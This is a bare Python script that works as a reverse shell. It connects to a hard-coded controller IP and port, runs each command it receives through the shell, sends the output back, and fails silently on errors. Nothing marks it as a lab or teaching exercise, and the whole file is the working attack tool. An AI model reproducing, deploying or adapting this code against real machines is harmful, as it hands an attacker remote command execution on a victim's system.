#!/bin/python3
import socket
import subprocess
import os

def connect():
    host = '192.168.198.129'  # ← your server IP
    port = 5555

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((host, port))

        while True:
            command = s.recv(1024).decode()
            if command.lower() == "exit":
                break
            elif command.startswith("cd "):
                try:
                    os.chdir(command[3:])
                    s.send(f"[+] Changed directory to {os.getcwd()}".encode())
                except Exception as e:
                    s.send(f"[-] {str(e)}".encode())
            else:
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    s.send(output)
                except subprocess.CalledProcessError as e:
                    s.send(e.output)
    except Exception as e:
        pass  # Fail silently or retry if needed
    finally:
        s.close()

connect()
